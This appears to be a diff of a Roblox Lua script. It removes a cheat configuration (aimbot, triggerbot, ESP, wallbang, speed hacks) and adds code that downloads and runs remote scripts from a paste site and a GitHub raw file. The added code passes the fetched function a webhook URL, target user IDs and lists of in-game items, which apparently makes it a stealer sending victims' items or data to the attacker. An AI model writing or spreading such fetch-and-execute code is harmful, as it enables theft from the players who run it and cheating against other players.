@@ -1,77 +1,10 @@
-script_key = "Key here"
-getgenv().aviri = {
-    ["global"] = { ["target mode"] = "Select" },
-    ["binds"] = {
-        ["select"] = "C",
-        ["camera aimbot"] = "C",
-        ["triggerbot"] = "C",
-        ["speed"] = "X",
-        ["esp"] = "P",
-    },
-    ["checks"] = {
-        ["visible check"] = true,
-        ["knock check"] = true,
-        ["ko check"] = true,
-        ["forcefield check"] = true,
-    },
-    ["esp"] = {
-        ["enabled"] = true,
-        ["position"] = "Bottom",
-        ["size"] = 1.1,
-        ["normal color"] = Color3.fromRGB(255, 255, 255),
-        ["target color"] = Color3.fromRGB(0, 255, 0),
-    },
-    ["silent aimbot"] = {
-        ["enabled"] = true,
-        ["hitpart"] = "Closest Point",
-        ["closest point"] = { ["mode"] = "Advanced", ["scale"] = 1, ["density"] = 4 },
-        ["fov"] = {
-            ["type"] = "3D",
-            ["show fov"] = false,
-            ["radius"] = 75,
-            ["size"] = 4.2,
-        },
-    },
-    ["camera aimbot"] = {
-        ["enabled"] = false,
-        ["mode"] = "Toggle",
-        ["hitpart"] = "Closest Point",
-        ["closest point"] = 0.09,
-        ["smoothing"] = 0.06,
-        ["humanize"] = 0,
-        ["fov"] = 750,
-        ["show fov"] = false,
-        ["force hit"] = true,
-    },
-    ["inf range"] = {
-        ["enabled"] = true,
-    },
-    ["wallbang"] = {
-        ["enabled"] = true,
-    },
-    ["trigger bot"] = {
-        ["enabled"] = true,
-        ["distance"] = 750,
-        ["mode"] = "Hold",
-        ["type"] = "FOV",
-        ["delay"] = 0,
-        ["fov"] = {
-            ["type"] = "2D",
-            ["show fov"] = false,
-            ["radius"] = 150,
-            ["size"] = 1.5,
-        },
-        ["force trigger"] = true,
-    },
-    ["spread modifications"] = {
-        ["enabled"] = true,
-        ["Double-Barrel SG"] = 0,
-        ["TacticalShotgun"] = 0,
-    },
-    ["speed modifications"] = {
-        ["enabled"] = true,
-        ["normal"] = { ["multiplier"] = 45 },
-        ["low health"] = { ["health threshold"] = 35, ["multiplier"] = 45 },
-    },
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/d560527d3ffe06a1ec3fc1f9ac67d755.lua"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+
+    task.wait(1)
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
